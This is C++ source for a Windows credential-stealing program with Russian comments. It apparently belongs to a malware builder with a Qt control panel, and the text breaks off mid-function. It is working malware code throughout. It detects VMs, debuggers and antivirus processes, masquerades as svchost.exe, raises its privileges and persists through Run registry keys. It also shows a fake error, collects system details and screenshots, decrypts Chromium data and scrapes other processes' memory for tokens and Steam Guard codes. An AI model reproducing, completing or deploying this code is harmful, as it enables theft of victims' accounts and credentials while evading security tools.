#include <windows.h>
#include <ntstatus.h>
#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include <vector>
#include <regex>
#include <gdiplus.h>
#include <tlhelp32.h>
#include <iphlpapi.h>
#include <wininet.h>
#include <psapi.h>
#include <shlobj.h>
#include <sqlite3.h>
#include <wincrypt.h>
#include <urlmon.h>
#include <filesystem>
#include <random>
#include <time.h>
#include <zip.h>
#include <QApplication>
#include <QMainWindow>
#include <QThread>
#include <QNetworkAccessManager>
#include <QNetworkRequest>
#include <QNetworkReply>
#include <QHttpMultiPart>
#include <QFile>
#include <QFileDialog>
#include <QMessageBox>
#include <QSettings>
#include <mutex>
#include <thread>
#include <memoryapi.h>
#include <bcrypt.h>

#include "mainwindow.h"
#include "build_key.h"
#include "polymorphic_code.h"
#include "junk_code.h"

// Определение NT_SUCCESS, если он отсутствует
#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif

// Переопределение типов для совместимости
typedef enum _THREADINFOCLASS {
    ThreadBasicInformation = 0,
    ThreadQuerySetWin32StartAddress = 9
} THREADINFOCLASS;

typedef struct _THREAD_BASIC_INFORMATION {
    NTSTATUS ExitStatus;
    PVOID TebBaseAddress;
    ULONG_PTR ClientId;
    ULONG_PTR AffinityMask;
    LONG Priority;
    LONG BasePriority;
} THREAD_BASIC_INFORMATION, *PTHREAD_BASIC_INFORMATION;

// Глобальные переменные
std::mutex g_mutex;
MainWindow* g_mainWindow = nullptr;
Gdiplus::GdiplusStartupInput gdiplusStartupInput;
ULONG_PTR gdiplusToken;

// Функция для логирования
void Log(const QString& message) {
    std::lock_guard<std::mutex> lock(g_mutex);
    if (g_mainWindow) {
        g_mainWindow->emitLog(message);
    }
}

// Реализация шифрования данных
std::string EncryptData(const std::string& data, const std::string& key1, const std::string& key2, const std::string& salt) {
    if (data.empty() || key1.empty() || key2.empty() || salt.empty()) {
        throw std::runtime_error("Encryption parameters cannot be empty");
    }

    // Получаем ключи и IV из build_key.h
    std::array<unsigned char, 16> encryptionKey1 = GetStaticEncryptionKey(key1);
    std::array<unsigned char, 16> encryptionKey2 = GetStaticEncryptionKey(key2);
    std::array<unsigned char, 16> iv = GenerateIV();

    // Объединяем ключи
    std::vector<unsigned char> combinedKey(32); // Для AES-256 нужно 32 байта
    std::copy(encryptionKey1.begin(), encryptionKey1.end(), combinedKey.begin());
    std::copy(encryptionKey2.begin(), encryptionKey2.end(), combinedKey.begin() + 16);

    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    NTSTATUS status;

    // Открываем алгоритм AES
    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
    if (!BCRYPT_SUCCESS(status)) {
        throw std::runtime_error("Failed to open AES algorithm provider: " + std::to_string(status));
    }

    // Устанавливаем режим CBC
    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        throw std::runtime_error("Failed to set chaining mode: " + std::to_string(status));
    }

    // Генерируем ключ
    status = BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, combinedKey.data(), combinedKey.size(), 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        throw std::runtime_error("Failed to generate symmetric key: " + std::to_string(status));
    }

    // Подготавливаем данные для шифрования
    DWORD cbData = 0, cbResult = 0;
    status = BCryptEncrypt(hKey, (PUCHAR)data.data(), data.size(), nullptr, iv.data(), iv.size(), nullptr, 0, &cbData, BCRYPT_BLOCK_PADDING);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        throw std::runtime_error("Failed to calculate encrypted data size: " + std::to_string(status));
    }

    std::vector<BYTE> encryptedData(cbData);
    status = BCryptEncrypt(hKey, (PUCHAR)data.data(), data.size(), nullptr, iv.data(), iv.size(), encryptedData.data(), cbData, &cbResult, BCRYPT_BLOCK_PADDING);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        throw std::runtime_error("Failed to encrypt data: " + std::to_string(status));
    }

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    // Добавляем IV в начало зашифрованных данных
    std::vector<BYTE> finalData(iv.size() + cbResult);
    std::copy(iv.begin(), iv.end(), finalData.begin());
    std::copy(encryptedData.begin(), encryptedData.begin() + cbResult, finalData.begin() + iv.size());

    // Преобразуем зашифрованные данные (включая IV) в строку base64
    DWORD base64Size = 0;
    CryptBinaryToStringA(finalData.data(), finalData.size(), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, nullptr, &base64Size);
    std::vector<char> base64Data(base64Size);
    CryptBinaryToStringA(finalData.data(), finalData.size(), CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, base64Data.data(), &base64Size);

    return std::string(base64Data.data(), base64Size - 1); // Убираем завершающий \0
}

// Реализация дешифрования данных
std::string DecryptData(const std::string& encryptedData) {
    if (encryptedData.empty()) {
        return "";
    }

    if (!g_mainWindow) {
        return "";
    }

    std::string key1 = g_mainWindow->config.encryptionKey1;
    std::string key2 = g_mainWindow->config.encryptionKey2;
    std::string salt = g_mainWindow->config.encryptionSalt;

    if (key1.empty() || key2.empty() || salt.empty()) {
        Log(QString("Decryption keys or salt are empty"));
        return "";
    }

    // Декодируем base64
    DWORD binarySize = 0;
    CryptStringToBinaryA(encryptedData.c_str(), encryptedData.size(), CRYPT_STRING_BASE64, nullptr, &binarySize, nullptr, nullptr);
    std::vector<BYTE> binaryData(binarySize);
    CryptStringToBinaryA(encryptedData.c_str(), encryptedData.size(), CRYPT_STRING_BASE64, binaryData.data(), &binarySize, nullptr, nullptr);

    // Извлекаем IV (первые 16 байт)
    if (binarySize < 16) {
        Log(QString("Encrypted data too short to contain IV"));
        return "";
    }
    std::array<unsigned char, 16> iv;
    std::copy(binaryData.begin(), binaryData.begin() + 16, iv.begin());

    // Оставшиеся данные — это зашифрованный текст
    std::vector<BYTE> encryptedContent(binaryData.begin() + 16, binaryData.end());
    DWORD encryptedSize = binarySize - 16;

    // Получаем ключи
    std::array<unsigned char, 16> encryptionKey1 = GetStaticEncryptionKey(key1);
    std::array<unsigned char, 16> encryptionKey2 = GetStaticEncryptionKey(key2);

    // Объединяем ключи
    std::vector<unsigned char> combinedKey(32);
    std::copy(encryptionKey1.begin(), encryptionKey1.end(), combinedKey.begin());
    std::copy(encryptionKey2.begin(), encryptionKey2.end(), combinedKey.begin() + 16);

    BCRYPT_ALG_HANDLE hAlg = nullptr;
    BCRYPT_KEY_HANDLE hKey = nullptr;
    NTSTATUS status;

    // Открываем алгоритм AES
    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, nullptr, 0);
    if (!BCRYPT_SUCCESS(status)) {
        Log(QString::fromStdString("Failed to open AES algorithm provider for decryption: " + std::to_string(status)));
        return "";
    }

    // Устанавливаем режим CBC
    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        Log(QString::fromStdString("Failed to set chaining mode for decryption: " + std::to_string(status)));
        return "";
    }

    // Генерируем ключ
    status = BCryptGenerateSymmetricKey(hAlg, &hKey, nullptr, 0, combinedKey.data(), combinedKey.size(), 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        Log(QString::fromStdString("Failed to generate symmetric key for decryption: " + std::to_string(status)));
        return "";
    }

    // Дешифруем данные
    DWORD cbData = 0, cbResult = 0;
    status = BCryptDecrypt(hKey, encryptedContent.data(), encryptedSize, nullptr, iv.data(), iv.size(), nullptr, 0, &cbData, BCRYPT_BLOCK_PADDING);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        Log(QString::fromStdString("Failed to calculate decrypted data size: " + std::to_string(status)));
        return "";
    }

    std::vector<BYTE> decryptedData(cbData);
    status = BCryptDecrypt(hKey, encryptedContent.data(), encryptedSize, nullptr, iv.data(), iv.size(), decryptedData.data(), cbData, &cbResult, BCRYPT_BLOCK_PADDING);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        Log(QString::fromStdString("Failed to decrypt data: " + std::to_string(status)));
        return "";
    }

    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);

    return std::string((char*)decryptedData.data(), cbResult);
}

// Проверка на виртуальную машину
bool CheckVirtualEnvironment() {
    bool isVM = false;

    // Проверка реестра на наличие идентификаторов виртуальных машин
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char value[256] = {0};
        DWORD size = sizeof(value);
        if (RegQueryValueExA(hKey, "Identifier", nullptr, nullptr, (LPBYTE)value, &size) == ERROR_SUCCESS) {
            std::string identifier(value);
            if (identifier.find("VBOX") != std::string::npos || identifier.find("VMWARE") != std::string::npos ||
                identifier.find("QEMU") != std::string::npos || identifier.find("VIRTUAL") != std::string::npos) {
                Log(QString::fromStdString("VM detected via SCSI identifier: " + identifier));
                isVM = true;
            }
        }
        RegCloseKey(hKey);
    }

    // Проверка наличия модулей песочницы или отладчика
    if (GetModuleHandleA("SbieDll.dll")) {
        Log(QString("Sandboxie detected (SbieDll.dll)"));
        isVM = true;
    }
    if (GetModuleHandleA("dbghelp.dll")) {
        Log(QString("Debugger detected (dbghelp.dll)"));
        isVM = true;
    }

    // Проверка системной информации
    SYSTEM_INFO sysInfo{};
    GetSystemInfo(&sysInfo);
    if (sysInfo.dwNumberOfProcessors <= 2) {
        Log(QString::fromStdString("Low processor count detected: " + std::to_string(sysInfo.dwNumberOfProcessors)));
        isVM = true;
    }

    MEMORYSTATUSEX memStatus{};
    memStatus.dwLength = sizeof(memStatus);
    GlobalMemoryStatusEx(&memStatus);
    if (memStatus.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) {
        Log(QString::fromStdString("Low memory detected: " + std::to_string(memStatus.ullTotalPhys / (1024 * 1024)) + " MB"));
        isVM = true;
    }

    // Проверка времени выполнения
    LARGE_INTEGER freq{}, start{}, end{};
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);
    for (volatile int i = 0; i < 100000; i++);
    QueryPerformanceCounter(&end);
    double elapsed = (end.QuadPart - start.QuadPart) * 1000.0 / freq.QuadPart;
    if (elapsed > 50) {
        Log(QString::fromStdString("Suspicious execution time detected: " + std::to_string(elapsed) + " ms"));
        isVM = true;
    }

    // Проверка MAC-адреса
    ULONG bufferSize = 15000;
    std::vector<char> buffer(bufferSize);
    PIP_ADAPTER_INFO adapterInfo = reinterpret_cast<PIP_ADAPTER_INFO>(buffer.data());
    if (GetAdaptersInfo(adapterInfo, &bufferSize) == NO_ERROR) {
        for (PIP_ADAPTER_INFO adapter = adapterInfo; adapter; adapter = adapter->Next) {
            std::string mac;
            for (unsigned int i = 0; i < adapter->AddressLength; i++) {
                char macByte[3];
                sprintf_s(macByte, "%02X", adapter->Address[i]);
                mac += macByte;
                if (i < adapter->AddressLength - 1) mac += "-";
            }
            if (mac.find("00-50-56") != std::string::npos || // VMware
                mac.find("00-0C-29") != std::string::npos || // VMware
                mac.find("00-1C-14") != std::string::npos || // VMware
                mac.find("00-05-69") != std::string::npos || // VMware
                mac.find("08-00-27") != std::string::npos) { // VirtualBox
                Log(QString::fromStdString("VM MAC address detected: " + mac));
                isVM = true;
            }
        }
    }

    // Проверка специфических драйверов
    const char* vmDrivers[] = {"VBoxDrv.sys", "vmci.sys", "vmhgfs.sys", "vmmemctl.sys", nullptr};
    for (int i = 0; vmDrivers[i]; i++) {
        std::string driverPath = "C:\\Windows\\System32\\drivers\\" + std::string(vmDrivers[i]);
        if (std::filesystem::exists(driverPath)) {
            Log(QString::fromStdString("VM driver detected: " + std::string(vmDrivers[i])));
            isVM = true;
        }
    }

    return isVM;
}

// Проверка на отладчик или антивирус
bool CheckDebuggerOrAntivirus() {
    if (IsDebuggerPresent()) {
        Log(QString("Debugger detected via IsDebuggerPresent"));
        return true;
    }

    typedef NTSTATUS(NTAPI *pNtQueryInformationThread)(HANDLE, THREADINFOCLASS, PVOID, ULONG, PULONG);
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        Log(QString("Failed to load ntdll.dll for NtQueryInformationThread"));
        return false;
    }

    pNtQueryInformationThread NtQueryInformationThread = reinterpret_cast<pNtQueryInformationThread>(
        GetProcAddress(hNtdll, "NtQueryInformationThread"));
    if (!NtQueryInformationThread) {
        Log(QString("Failed to get NtQueryInformationThread address"));
        return false;
    }

    THREAD_BASIC_INFORMATION tbi{};
    NTSTATUS status = NtQueryInformationThread(GetCurrentThread(), ThreadBasicInformation, &tbi, sizeof(tbi), nullptr);
    if (NT_SUCCESS(status) && tbi.TebBaseAddress) {
        DWORD debugPort = 0;
        status = NtQueryInformationThread(GetCurrentThread(), ThreadQuerySetWin32StartAddress, &debugPort, sizeof(debugPort), nullptr);
        if (NT_SUCCESS(status) && debugPort != 0) {
            Log(QString("Debugger detected via NtQueryInformationThread"));
            return true;
        }
    }

    const char* avProcesses[] = {
        "avp.exe", "MsMpEng.exe", "avgui.exe", "egui.exe", "McTray.exe",
        "norton.exe", "avastui.exe", "kav.exe", "wireshark.exe", "ollydbg.exe", nullptr
    };
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        Log(QString("Failed to create process snapshot for AV check"));
        return false;
    }

    PROCESSENTRY32W pe32{};
    pe32.dwSize = sizeof(pe32);
    bool avDetected = false;
    if (Process32FirstW(hProcessSnap, &pe32)) {
        do {
            for (int i = 0; avProcesses[i]; i++) {
                std::wstring wAvProcess(avProcesses[i], avProcesses[i] + strlen(avProcesses[i]));
                if (_wcsicmp(pe32.szExeFile, wAvProcess.c_str()) == 0) {
                    Log(QString::fromStdString("Antivirus process detected: " + std::string(avProcesses[i])));
                    avDetected = true;
                    break;
                }
            }
        } while (Process32NextW(hProcessSnap, &pe32) && !avDetected);
    }
    CloseHandle(hProcessSnap);
    return avDetected;
}

// Антианализ
bool AntiAnalysis() {
    if (!g_mainWindow) return false;

    if (g_mainWindow->config.antiVM && CheckVirtualEnvironment()) {
        Log(QString("Virtual machine detected, exiting"));
        return true;
    }

    if (CheckDebuggerOrAntivirus()) {
        Log(QString("Debugger or Antivirus detected, exiting"));
        return true;
    }

    LARGE_INTEGER freq{}, start{}, end{};
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);
    for (volatile int i = 0; i < 1000000; i++);
    QueryPerformanceCounter(&end);
    double elapsed = (end.QuadPart - start.QuadPart) * 1000.0 / freq.QuadPart;
    if (elapsed > 100) {
        Log(QString::fromStdString("Suspicious execution time detected: " + std::to_string(elapsed) + " ms, exiting"));
        return true;
    }

    HANDLE hThreadSnap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (hThreadSnap != INVALID_HANDLE_VALUE) {
        THREADENTRY32 te32{};
        te32.dwSize = sizeof(te32);
        int threadCount = 0;
        if (Thread32First(hThreadSnap, &te32)) {
            do {
                if (te32.th32OwnerProcessID == GetCurrentProcessId()) threadCount++;
            } while (Thread32Next(hThreadSnap, &te32));
        }
        CloseHandle(hThreadSnap);
        if (threadCount > 50) {
            Log(QString::fromStdString("Too many threads detected: " + std::to_string(threadCount) + ", exiting"));
            return true;
        }
    } else {
        Log(QString("Failed to create thread snapshot for anti-analysis"));
    }

    char processName[MAX_PATH] = {0};
    GetModuleFileNameA(nullptr, processName, MAX_PATH);
    std::string procName = std::filesystem::path(processName).filename().string();
    if (procName.find("analyzer") != std::string::npos || procName.find("sandbox") != std::string::npos) {
        Log(QString::fromStdString("Suspicious process name detected: " + procName + ", exiting"));
        return true;
    }

    return false;
}

// Маскировка процесса
void MaskProcess() {
    HANDLE hProcess = GetCurrentProcess();
    SetPriorityClass(hProcess, HIGH_PRIORITY_CLASS);
    wchar_t systemPath[MAX_PATH] = {0};
    GetSystemDirectoryW(systemPath, MAX_PATH);
    wcscat_s(systemPath, L"\\svchost.exe");
    SetFileAttributesW(systemPath, FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_HIDDEN);

    typedef NTSTATUS(NTAPI *pNtSetInformationProcess)(HANDLE, DWORD, PVOID, ULONG);
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) {
        Log(QString("Failed to load ntdll.dll for NtSetInformationProcess"));
        return;
    }

    pNtSetInformationProcess NtSetInformationProcess = reinterpret_cast<pNtSetInformationProcess>(
        GetProcAddress(hNtdll, "NtSetInformationProcess"));
    if (!NtSetInformationProcess) {
        Log(QString("Failed to get NtSetInformationProcess address"));
        return;
    }

    wchar_t fakeName[] = L"svchost.exe";
    NTSTATUS status = NtSetInformationProcess(hProcess, 0x1C, fakeName, sizeof(fakeName));
    if (NT_SUCCESS(status)) {
        Log(QString("Process masked as svchost.exe"));
    } else {
        Log(QString("Failed to mask process: " + QString::number(status)));
    }
}

// Повышение привилегий и скрытие
void Stealth() {
    if (!g_mainWindow || !g_mainWindow->config.silent) return;

    SetFileAttributesA(GetCommandLineA(), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
    MaskProcess();

    HANDLE hToken = nullptr;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) {
        TOKEN_PRIVILEGES tp{};
        tp.PrivilegeCount = 1;
        LookupPrivilegeValue(nullptr, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), nullptr, nullptr);
        CloseHandle(hToken);
        Log(QString("Privileges elevated"));
    } else {
        Log(QString("Failed to elevate privileges"));
    }
}

// Добавление в автозапуск
void AddToStartup() {
    if (!g_mainWindow || !g_mainWindow->config.autoStart) return;

    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        char path[MAX_PATH] = {0};
        GetModuleFileNameA(nullptr, path, MAX_PATH);
        RegSetValueExA(hKey, "svchost", 0, REG_SZ, (BYTE*)path, strlen(path) + 1);
        RegCloseKey(hKey);
        Log(QString("Added to startup (HKEY_CURRENT_USER)"));
    } else {
        Log(QString("Failed to add to startup (HKEY_CURRENT_USER)"));
    }
}

// Обеспечение персистентности
void Persist() {
    if (!g_mainWindow || !g_mainWindow->config.persist) return;

    AddToStartup();
    HKEY hKey;
    if (RegCreateKeyA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hKey) == ERROR_SUCCESS) {
        char path[MAX_PATH] = {0};
        GetModuleFileNameA(nullptr, path, MAX_PATH);
        RegSetValueExA(hKey, "SystemService", 0, REG_SZ, (BYTE*)path, strlen(path) + 1);
        RegCloseKey(hKey);
        Log(QString("Persisted in HKEY_LOCAL_MACHINE"));
    } else {
        Log(QString("Failed to persist (HKEY_LOCAL_MACHINE)"));
    }
}

// Отображение фейковой ошибки
void FakeError() {
    if (!g_mainWindow || !g_mainWindow->config.fakeError) return;

    MessageBoxA(nullptr, "System Error: svchost.exe has stopped working.", "System Error", MB_ICONERROR);
    Log(QString("Displayed fake error message"));
}

// Получение версии ОС через RtlGetVersion
typedef NTSTATUS(WINAPI *RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
bool GetOSVersion(RTL_OSVERSIONINFOW& osInfo) {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) {
        return false;
    }

    RtlGetVersionPtr RtlGetVersion = (RtlGetVersionPtr)GetProcAddress(hNtdll, "RtlGetVersion");
    if (!RtlGetVersion) {
        return false;
    }

    osInfo.dwOSVersionInfoSize = sizeof(RTL_OSVERSIONINFOW);
    return RtlGetVersion(&osInfo) == 0;
}

// Получение системной информации
std::string GetCustomSystemInfo() {
    if (!g_mainWindow || !g_mainWindow->config.systemInfo) return "";

    std::string result;
    char username[256] = {0};
    DWORD usernameLen = sizeof(username);
    if (GetUserNameA(username, &usernameLen)) {
        result += "Username: " + std::string(username) + "\n";
    } else {
        result += "Username: Unknown\n";
        Log(QString("Failed to get username"));
    }

    char computerName[256] = {0};
    DWORD computerNameLen = sizeof(computerName);
    if (GetComputerNameA(computerName, &computerNameLen)) {
        result += "Computer Name: " + std::string(computerName) + "\n";
    } else {
        result += "Computer Name: Unknown\n";
        Log(QString("Failed to get computer name"));
    }

    SYSTEM_INFO sysInfo{};
    GetSystemInfo(&sysInfo);
    result += "Processor Architecture: " + std::to_string(sysInfo.wProcessorArchitecture) + "\n";
    result += "Number of Processors: " + std::to_string(sysInfo.dwNumberOfProcessors) + "\n";

    MEMORYSTATUSEX memInfo{};
    memInfo.dwLength = sizeof(memInfo);
    if (GlobalMemoryStatusEx(&memInfo)) {
        result += "Total Physical Memory: " + std::to_string(memInfo.ullTotalPhys / (1024 * 1024)) + " MB\n";
        result += "Available Physical Memory: " + std::to_string(memInfo.ullAvailPhys / (1024 * 1024)) + " MB\n";
    } else {
        result += "Memory Info: Unknown\n";
        Log(QString("Failed to get memory info"));
    }

    RTL_OSVERSIONINFOW osInfo{};
    if (GetOSVersion(osInfo)) {
        result += "OS Version: " + std::to_string(osInfo.dwMajorVersion) + "." + std::to_string(osInfo.dwMinorVersion) + "\n";
        result += "Build Number: " + std::to_string(osInfo.dwBuildNumber) + "\n";
    } else {
        result += "OS Info: Unknown\n";
        Log(QString("Failed to get OS version"));
    }

    ULONG bufferSize = 15000;
    std::vector<char> buffer(bufferSize);
    PIP_ADAPTER_INFO adapterInfo = reinterpret_cast<PIP_ADAPTER_INFO>(buffer.data());
    if (GetAdaptersInfo(adapterInfo, &bufferSize) == NO_ERROR) {
        for (PIP_ADAPTER_INFO adapter = adapterInfo; adapter; adapter = adapter->Next) {
            result += "Adapter Name: " + std::string(adapter->AdapterName) + "\n";
            result += "Description: " + std::string(adapter->Description) + "\n";
            result += "MAC Address: ";
            for (unsigned int i = 0; i < adapter->AddressLength; i++) {
                char mac[3];
                sprintf_s(mac, "%02X", adapter->Address[i]);
                result += mac;
                if (i < adapter->AddressLength - 1) result += "-";
            }
            result += "\nIP Address: " + std::string(adapter->IpAddressList.IpAddress.String) + "\n";
        }
    } else {
        result += "Network Info: Unknown\n";
        Log(QString("Failed to get network adapters info"));
    }

    return result;
}

// Создание скриншота
std::string TakeScreenshot(const std::string& dir) {
    if (!g_mainWindow || !g_mainWindow->config.screenshot) return "";

    HDC hScreenDC = GetDC(nullptr);
    if (!hScreenDC) {
        Log(QString("Failed to get screen DC"));
        return "";
    }

    HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
    if (!hMemoryDC) {
        ReleaseDC(nullptr, hScreenDC);
        Log(QString("Failed to create memory DC"));
        return "";
    }

    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);
    HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
    if (!hBitmap) {
        DeleteDC(hMemoryDC);
        ReleaseDC(nullptr, hScreenDC);
        Log(QString("Failed to create bitmap"));
        return "";
    }

    SelectObject(hMemoryDC, hBitmap);
    BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);
    Gdiplus::Bitmap bitmap(hBitmap, nullptr);
    CLSID clsid;
    HRESULT hr = CLSIDFromString(L"{557cf401-1a04-11d3-9a73-0000f81ef32e}", &clsid); // JPEG
    if (FAILED(hr)) {
        DeleteDC(hMemoryDC);
        ReleaseDC(nullptr, hScreenDC);
        DeleteObject(hBitmap);
        Log(QString("Failed to get JPEG CLSID"));
        return "";
    }

    std::string screenshotName = dir + "\\screenshot_" + std::to_string(GetTickCount()) + ".jpg";
    std::wstring screenshotNameW(screenshotName.begin(), screenshotName.end());
    hr = bitmap.Save(screenshotNameW.c_str(), &clsid, nullptr);
    if (FAILED(hr)) {
        screenshotName.clear();
        Log(QString("Failed to save screenshot"));
    } else {
        Log(QString::fromStdString("Screenshot saved: " + screenshotName));
    }

    DeleteDC(hMemoryDC);
    ReleaseDC(nullptr, hScreenDC);
    DeleteObject(hBitmap);
    return screenshotName;
}

// Дешифрование данных Chromium
std::string DecryptChromiumData(DATA_BLOB& encryptedData) {
    DATA_BLOB decryptedData{};
    if (CryptUnprotectData(&encryptedData, nullptr, nullptr, nullptr, nullptr, 0, &decryptedData)) {
        std::string result((char*)decryptedData.pbData, decryptedData.cbData);
        LocalFree(decryptedData.pbData);
        return result;
    }

    Log(QString::fromStdString("Failed to decrypt Chromium data: " + std::to_string(GetLastError())));
    return "";
}

// Захват WebSocket сессий
std::string CaptureWebSocketSessions(const std::string& processName) {
    std::string result;
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        Log(QString("Failed to create process snapshot for WebSocket capture"));
        return result;
    }

    PROCESSENTRY32W pe32{};
    pe32.dwSize = sizeof(pe32);
    if (Process32FirstW(hProcessSnap, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, std::wstring(processName.begin(), processName.end()).c_str()) == 0) {
                HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
                if (hProcess) {
                    char buffer[4096] = {0};
                    SIZE_T bytesRead = 0;
                    MEMORY_BASIC_INFORMATION mbi{};
                    LPVOID address = 0;
                    while (VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi))) {
                        if (mbi.State == MEM_COMMIT && (mbi.Protect == PAGE_READWRITE || mbi.Protect == PAGE_READONLY)) {
                            if (ReadProcessMemory(hProcess, address, buffer, sizeof(buffer), &bytesRead)) {
                                std::string memoryData(buffer, bytesRead);
                                std::regex wsRegex("wss?://[^\\s]+");
                                std::smatch match;
                                std::string::const_iterator searchStart(memoryData.cbegin());
                                while (std::regex_search(searchStart, memoryData.cend(), match, wsRegex)) {
                                    result += "WebSocket URL: " + match[0].str() + "\n";
                                    searchStart = match.suffix().first;
                                }
                                std::regex steamGuardRegex("Steam Guard Code: [A-Z0-9]{5}");
                                searchStart = memoryData.cbegin();
                                while (std::regex_search(searchStart, memoryData.cend(), match, steamGuardRegex)) {
                                    result += "Steam Guard Code: " + match[0].str() + "\n";
                                    searchStart = match.suffix().first;
                                }
                                std::regex tokenRegex("[a-zA-Z0-9]{24}\\.[a-zA-Z0-9]{6}\\.[a-zA-Z0-9_-]{27}");
                                searchStart = memoryData.cbegin();
                                while (std::regex_search(searchStart, memoryData.cend(), match, tokenRegex)) {
                                    result += "WebSocket Token: " + match[0].str() + "\n";
                                    searchStart = match.suffix().first;
                                }
                            }
                        }
                        address = (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize);
                    }
                    CloseHandle(hProcess);
                }
            }
        } while (Process32NextW(hProcessSnap, &pe32));
    }
    CloseHandle(hProcessSnap);
    return result;
}

// Захват WebRTC сессий
std::string CaptureWebRTCSessions(const std::string& processName) {
    std::string result;
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        Log(QString("Failed to create process snapshot for WebRTC capture"));
        return result;
    }

    PROCESSENTRY32W pe32{};
    pe32.dwSize = sizeof(pe32);
    if (Process32FirstW(hProcessSnap, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, std::wstring(processName.begin(), processName.end()).c_str()) == 0) {
                HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe32.th32ProcessID);
                if (hProcess) {
                    char buffer[4096] = {0};
                    SIZE_T bytesRead = 0;
                    MEMORY_BASIC_INFORMATION mbi{};
                    LPVOID address = 0;
                    while (VirtualQueryEx(hProcess, address, &mbi, sizeof(mbi))) {
                        if (mbi.State == MEM_COMMIT && (mbi.Protect == PAGE_READWRITE || mbi.Protect == PAGE_READONLY)) {
                            if (ReadProcessMemory(hProcess, address, buffer, sizeof(buffer), &bytesRead)) {
                                std::string memoryData(buffer, bytesRead);
                                std::regex webrtcRegex("ice-ufrag:[a-zA-Z0-9+/=]+");
                                std::smatch match;
                                std::string::const_iterator searchStart(memoryData.cbegin());
                                while (std::regex_search(searchStart, memoryData.cend(), match, webrtcRegex)) {
                                    result += "WebRTC ICE Candidate: " + match[0].str() + "\n";
                                    searchStart = match.suffix().first;
                                }
                                std::regex ipRegex("\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b");
                                searchStart = memoryData.cbegin();
                                while (std::regex_search(searchStart, memoryData.cend(), match, ipRegex)) {
